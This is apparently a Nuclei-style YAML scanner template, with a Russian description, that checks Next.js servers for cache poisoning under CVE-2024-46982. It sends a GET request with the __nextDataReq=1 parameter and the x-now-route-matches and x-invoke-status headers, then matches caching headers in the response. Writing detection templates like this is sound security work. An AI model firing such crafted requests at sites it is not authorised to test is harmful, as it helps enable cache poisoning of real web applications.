id: nextjs-cache-poisoning
info:
  name: "Next.js Cache Poisoning Detection (CVE-2024-46982)"
  author: "d00m_r34p3r"
  severity: high
  description: |
    Шаблон проверяет, изменяется ли ответ сервера при использовании параметра `__nextDataReq=1`
    вместе с заголовком `x-now-route-matches: 1`. Если в ответе обнаруживается JSON с ключом `pageProps`
    и заголовок Cache-Control включает директивы `s-maxage=1` и `stale-while-revalidate`, это может свидетельствовать о
    возможности принудительного кеширования SSR-ответа как SSG.
    
    ВАЖНО: PoC отправляет только безопасные GET-запросы и не модифицирует содержимое сайта.
  reference:
    - "https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir"
  tags: nextjs, cache, cache-poisoning, cve, poc

requests:
  - method: GET
    path:
      - "{{BaseURL}}/poc?__nextDataReq=1"
    headers:
      x-now-route-matches: "1"
      x-invoke-status: "200"
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "pageProps"
      - type: word
        part: header
        words:
          - "s-maxage=1"
      - type: word
        part: header
        words:
          - "stale-while-revalidate"
